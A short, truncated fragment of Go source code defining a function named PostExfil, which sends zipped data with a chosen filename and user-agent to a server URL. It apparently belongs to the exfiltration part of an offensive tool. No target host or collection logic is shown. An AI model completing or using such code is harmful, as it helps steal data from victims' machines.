...
func PostExfil(serverURL string, zipData []byte, filename string, userAgent string) error {
	url := serverURL
	...
	return httpPost(url, zipData, filename, userAgent)
}

func httpPost(url string, body []byte, filename string, userAgent string) error {
	if len(url) < 8 {
